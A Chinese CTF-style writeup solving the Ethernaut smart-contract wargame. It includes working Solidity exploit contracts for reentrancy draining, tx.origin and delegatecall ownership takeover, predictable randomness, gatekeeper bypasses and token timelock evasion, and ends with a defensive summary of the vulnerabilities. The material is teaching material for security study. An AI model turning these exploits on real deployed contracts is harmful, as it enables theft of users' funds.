# 前言

偶然看到了一个由 包含经典以太坊智能合约漏洞 的一系列合约组成的实战wargame，就简单写一个附有exploit的writeup。

当然还有一些经典漏洞没有覆盖到，可以查看文末的扩展阅读。

wargame地址： https://ethernaut.zeppelin.solutions/ 。
题目简单，每关通关后也会有comment来解释实际含义，非常适合新入坑的同学

这篇writeup也包含了一些solidity语言remix IDE/web3.js的简单操作使用方法。

前置条件：基本了解智能合约概念，了解solidity语言，了解ETH web3 json RPC provider、metamask基本原理和使用

这套题目，智能合约都部署在Ropsten测试网络，因此先要根据level0提示去faucet获取些测试网络ether。这个平台本身也是一个DApp，由一个智能合约负责管理每个关卡的合约instance。

# level0 Hello Ethernaut
题目说明已经很详细了。点击`Get new instance`， 然后浏览器console输入`await contract.info()`即可开始（只要你安装配置好metamask），嫌麻烦或者`contract.abi`查看abi直接猜出来通关方法：

```
> await contract.password()
"ethernaut0"
> await contract.authenticate("ethernaut0")
<metamask中确认交易>
> await contract.getCleared()
true
```
然后点击`submit instance`即可

可能由于网络原因不太稳定，可以多试几次。

另，console提示信息非常魔性...

# level1 fallback

这题主要就是熟悉平台和remix使用的签到题

点击关卡的Get Instance，浏览器js console会返回新创建的合约的地址，复制下来再用remix IDE (https://remix.ethereum.org/) 交互 （我比较习惯remix IDE中交互，当然对于简单的操作，浏览器console里用web3.js的api像之前一样直接调用合约方法也可以）

```solidity
pragma solidity ^0.4.18;

contract Fallback {

  mapping(address => uint) public contributions;

  function contribute() public payable;

  function getContribution() public view returns (uint);

  function withdraw() public;

  function() payable public;
}
```
在remix compile后，在run标签里填入合约地址，然后点击`At address`即可交互了。

这题的思路是，先value=1wei调用contribute()，然后value=1wei调用fallback()即可重设owner，最后value=0调用withdraw完成任务。

需要了解owner、msg.value、payable、fallback函数的含义

# level2 fallout
这题注意有个`Fal1out`函数，与合约名`Fallout`不一致，因此不是构造函数（构造函数在合约生成后就不存在了，这一过程实际上是contract creation交易包含构造函数的bytecode，该交易执行构造函数bytecode，然后内存里是合约的其余代码的bytecode，然后ETH节点把返回的bytecode放置在链上与合约地址关联起来），我们可以调用此函数来claim ownership

# level3 coin flip

除了我们手动调用合约的函数，我们也可以写合约来调用合约，因此这题只要写solidity代码我们就能得到block的信息了，思路同0ctf 2018线下赛的ZeroLottery题目：
```solidity
pragma solidity ^0.4.18;

contract CoinFlip {
    uint256 public consecutiveWins;
    function flip(bool _guess) public returns (bool);
}

contract MyContract {
    CoinFlip c;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function MyContract(address coinFlip) public {
        c = CoinFlip(coinFlip);
    }
    
    function exploit() public returns (bool) {
        uint256 blockValue = uint256(block.blockhash(block.number-1));
    
        if (lastHash == blockValue) {
          revert();
        }
    
        lastHash = blockValue;
        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
        bool side = coinFlip == 1 ? true : false;
        return c.flip(side);
    }
}
```
remix IDE中compile后，我们需要部署MyContract，选择`injected web3` provider后在Deploy MyContract时，构造函数填入关卡合约instance的地址，然后在10个新区块中调用`exploit()`即可，需要花点时间，隔段时间等交易被打包进入一个区块后就又点击`exploit()`一次......10次比较蛋疼，尤其是网络不好

从这道题可以看出，智能合约系统内部没有安全的随机数，只能通过智能合约系统外部的调用实现。

# level4 telephone
这题主要考的就是tx.origin和msg.sender的区别了，在于msg.sender是函数的直接调用方，可能是你手工调用该函数，这时候是发起该交易的账户地址，也可以是调用该函数的一个智能合约的地址。但tx.origin一定只能是这个交易的原始发起方，无论中间有多少次合约内/跨合约函数调用，一定是账户地址而不是合约地址。因此只要写合约调用changeOwner即可，这时msg.sender是你写的智能合约地址，tx.origin是你的账户地址

```solidity
pragma solidity ^0.4.18;

contract Telephone {
  function changeOwner(address _owner);
}

contract MyContract {
    Telephone c;
    function MyContract(address _c) public {
        c = Telephone(_c);
    }
    
    function exploit() public returns (bool) {
        c.changeOwner(tx.origin);
    }
}
```

# level5 Token
整数溢出的问题，由于用的是uint无符号数，因此`20 - 21 = 0xFFFFFFFFF... > 0`，所以只要调用`transfer(随便一个地址, 21)`即可

# level6 delegation
我们看下delegatecall的文档：
```
There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values.
```
简要概括，就是msg.sender和msg.value不会变，被调用方法能够access所有调用方contract的成员属性，以方便实现在链上放置library的这一feature。那么，只要在Delegation里利用delegatecall调用Delegate.pwn()函数即可修改Delegation.owner。

如果熟悉raw格式的交易的data的同学会知道，data头4个byte是被调用方法的签名哈希，remix里调用函数，实质只是向合约账户地址发送了`(msg.data[0:4] == 函数签名哈希)`的一笔交易，然后合约的bytecode就会执行，bytecode中含有判断签名哈希的函数分发逻辑。我们只需要调用Delegation的fallback的同时在msg.data放入pwn函数的solidity签名即可。在remix里，我们可以更方便地实现这一exploit，我们只要在Delegation代码里放入pwn函数的solidity签名，remix调用Delegation的假pwn()即可，这样pwn的函数签名哈希就会放在msg.data[0:4]了（当然实际执行的代码还是fallback的函数），如下：

```solidity
pragma solidity ^0.4.18;

contract Delegation {
   function pwn() public;
}
```
编译后填入关卡instance地址，点击at address，然后调用pwn即可（注意gas limit要调大一点不然会out of gas，不要用默认计算的gas limit）

对此不熟悉的同学可以看看编译器对于solidity的函数分发实现部分的相关compiled EVM bytecode

# level7 Force
`selfdestruct`函数可以强行发送ETH, 可参考https://medium.com/@alexsherbuck/two-ways-to-force-ether-into-a-contract-1543c1311c56

```solidity
pragma solidity ^0.4.18;

contract Force {}

contract MyContract {
    Force c;
    function MyContract(address _c) public {
        c = Force(_c);
    }
    
    function exploit() payable public {
        selfdestruct(c);
    }
}
```

# level8 vault
区块链上所有东西都是公开的，查看json rpc文档可知道有`eth.getStorageAt()` API，根据solidity的“对象模型” (http://solidity.readthedocs.io/en/develop/miscellaneous.html)，可知`password`放在storage的1的位置

console里输入即可查看密码：
```js
web3.eth.getStorageAt(contract.address, 1, console.log);
```

如果在remix里调用unlock注意一下remix对bytes32参数的格式："0xXXXXXXXXX..." （包括双引号）

# level9 King
`king.transfer`函数在调用失败时会抛异常，后面`king = msg.sender;`就不会被执行，我们就达到目标了，因此只要让transfer时失败就行，我们让king不能接受eth transfer即可

```solidity
pragma solidity ^0.4.18;

contract King {
  address public king;
  uint public prize;
  function() external payable;
}

contract FallbackThrowException {
    address owner;
    
    function FallbackThrowException(address _c) payable public {
        owner = msg.sender;
        King c = King(_c);
        c.call.value(c.prize())();
    }
    
    function dtor() {
        selfdestruct(owner);
    }
    
    function() payable {
        throw;
    }
}
```

调用构造函数时，value=1.1 ether即可。

`FallbackThrowException`作为king时，transfer会调用`FallbackThrowException.fallback`，自然就throw失败了。

验证通过后可以调用dtor回收零头

# level10 Re-entrancy

由于`balances[msg.sender] -= _amount;`在发送ETH（`msg.sender.call.value(_amount)()`）的之后，我们可以用合约作为msg.sender，这样我们的合约的fallback函数就会在`msg.sender.call`被调用（在`-= _amount`之前），于是我们可以无限递归调用withdraw()函数来获得合约内所有的ETH。

```solidity
pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}

contract MyContract {
    Reentrance c;
    address owner;
    
    function MyContract(address _c) public payable {
        c = Reentrance(_c);
        owner = msg.sender;
        c.donate.value(msg.value)(this);
    }
    
    function() public payable {
        uint weHave = c.balanceOf(this);
        if (weHave > c.balance) {
            if (c.balance != 0) c.withdraw(c.balance);
            return;
        }
        c.withdraw(weHave);
    }
    
    function exploit() public {
        c.withdraw(0);
    }
    
    function dtor() {
        selfdestruct(owner);
    }
}
```
value=0.5 ether，填入关卡合约instance地址构造MyContract，然后调用exploit即可（注意要调大gas limit），调用dtor回收ETH。

这个漏洞的利用曾使得全网14%的以太坊被盗（被称为DAO Hack），社区决定以太坊分叉出ETH链，也就是ETH是回滚至被黑之前的链，ETC则是黑客拥有以太坊的原始链，由于矿工利益问题存活至今

# level11 Elevator

仔细阅读题目，可以想到这题的通关条件是`Elevator.top == true`。突破点在于interface里的view/constant/pure修饰符仅在于Solidity语言层面起作用，而实际EVM层面跨合约调用时并没有检查。于是，实际上isLastFloor是可以有副作用的。我们可以通过成员变量区分两次isLastFloor调用，第一次返回false第二次返回true即可。

```solidity
pragma solidity ^0.4.18;

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public;
}

contract MyBuilding {
  bool private isArrived = false;
  Elevator c;
  
  function MyBuilding(address _c) {
      c = Elevator(_c);
  }
  
  function isLastFloor(uint) public returns (bool) {
      if (!isArrived) {
          isArrived = true;
          return false;
      }
      return true;
  }
  
  function exploit() public {
      c.goTo(777);
  }
}

```

# level12 Privacy
同上面某题，只要调用eth.getStorageAt就可以了，注意ethereum是大端序，比如bytes4(msg.data)就是被调用方法签名的哈希。

```js
> web3.eth.getStorageAt("0x443ba829e54bc353a774e19cd0f4c463bbd70292", 3, console.log);
< null "0x855225da826cf02c945e41f445f2c7491d28ecdd3e99e12abca7629d8b49ca9f"
> "0x855225da826cf02c945e41f445f2c7491d28ecdd3e99e12abca7629d8b49ca9f".substr(0,34)
< "0x855225da826cf02c945e41f445f2c749"
```

然后调用unlock就行了

# level13 Gatekeeper One

关键的`msg.gas`只要复制一份代码，在remix js vm里点击debug单步调试，看看由调用enter开始直到汇编语句`GAS`时所用的gas是多少，然后设定gas=81910加上消耗掉的gas数和`GAS`本身消耗的2即可。

但是，每个版本compiler编译出来的指令都不太一样，因此看代码要选择0.4.18版本（https://remix.ethereum.org/#optimize=false&version=soljson-v0.4.18+commit.9cf6e910.js）。在这里就踩了一下坑..

剩下就是注意一下solidity的类型转换截断的实现。


```solidity
pragma solidity ^0.4.18;

contract GatekeeperOne {
  function enter(bytes8 _gateKey) public returns (bool);
}

contract MyAgent {
    GatekeeperOne c;
    
    function MyAgent(address _c) {
        c = GatekeeperOne(_c);
    }
    
    function exploit() {
        uint64 gateKey = uint16(tx.origin) + (1 << 44);
        c.enter.gas(81910-81697+81910+2)(bytes8(gateKey));
    }
}
```

# level14 Gatekeeper Two
查看以太坊黄皮书第十页底部（https://ethereum.github.io/yellowpaper/paper.pdf）
```
4 During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while
CODESIZE should return the length of the initialization code (as defined in H.2
```

因此只要在构造函数内调用enter即可，剩下无非就是一个异或的简单逻辑，显然0-1=0xFFFFFF...，而对任意X有~X ^ X == 0xFFFF...，因此代码如下：
```solidity
pragma solidity ^0.4.18;

contract GatekeeperTwo {
  address public entrant;
  function enter(bytes8 _gateKey) public returns (bool);
}

contract MyAgent {
    function MyAgent(address _c) {
        GatekeeperTwo c = GatekeeperTwo(_c);
        c.enter(bytes8(~uint64(keccak256(this))));
    }
}
```


# level15 Naught Coin

这题的合约继承了`ERC20/StandardToken`(https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/token/ERC20/StandardToken.sol)，因此也自然继承了里面的一些函数。

我们可以看到ERC20还包含了allowance这种功能，以及里面自带一个transferFrom函数。利用思路是，我们可以创建一个合约`MyAgent`，然后手工调用`StandardToken.approve()`授权该合约使用我们的tokens，然后我们通过该合约`MyAgent.getAllToken()`调用`StandardToken.transferFrom()`函数把tokens全部转移即可，非常简单。或者直接自己approve自己账户地址，然后调用transferFrom也行。

代码如下：
```solidity
pragma solidity ^0.4.18;

contract NaughtCoin {

  string public constant name = 'NaughtCoin';
  string public constant symbol = '0x0';
  uint public constant decimals = 18;
  uint public timeLock = now + 10 years;
  uint public INITIAL_SUPPLY = 1000000 * (10 ** decimals);
  address public player;
  
  function transferFrom(
    address _from,
    address _to,
    uint256 _value
  )
    public
    returns (bool);

  function transfer(address _to, uint256 _value) lockTokens public returns(bool);

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      if (now < timeLock) {
        _;
      }
    } else {
     _;
    }
  }

  function approve(address _spender, uint256 _value) public returns (bool);
}

contract MyAgent {
    address owner;
    NaughtCoin c;
    
    function MyAgent(address _c) public {
        owner = msg.sender;
        c = NaughtCoin(_c);
    }
    
    function getAllToken() public {
        c.transferFrom(owner, this, c.INITIAL_SUPPLY());
    }
}
```

# Vulnerbilities总结

1. 复制代码时注意改构造函数名...应该用constructor关键字而不是用deprecated的与合约同名的函数作为构造函数
2. 合约中生成随机数时要注意其不安全
3. 注意msg.sender可以是智能合约地址
4. 注意整数overflow和underflow，尽量用safemath库
5. delegatecall要注意安全性
6. 不能假设你的合约不能接受ETH，也就是说注意`this.balance == 0`的使用
7. 区块链上没有不公开的东西
8. Address.transfer要处理异常
9. Address.call不安全，可能会消耗大量的gas或Out of gas
10. 除了payable外，不能在字节码层面的外部合约的view/constant/pure修饰符做假设，除非这个合约一定是你控制的
11. 继承或引用代码时要全面了解其代码

# 附录

- FreeBuf简介文章
以太坊去中心化应用dApp的渗透测试姿势浅析
http://www.freebuf.com/articles/blockchain-articles/174050.html

- Solidity文档
http://solidity.readthedocs.io

- 扩展阅读
https://github.com/b-mueller/smashing-smart-contracts/blob/master/smashing-smart-contracts-1of1.pdf
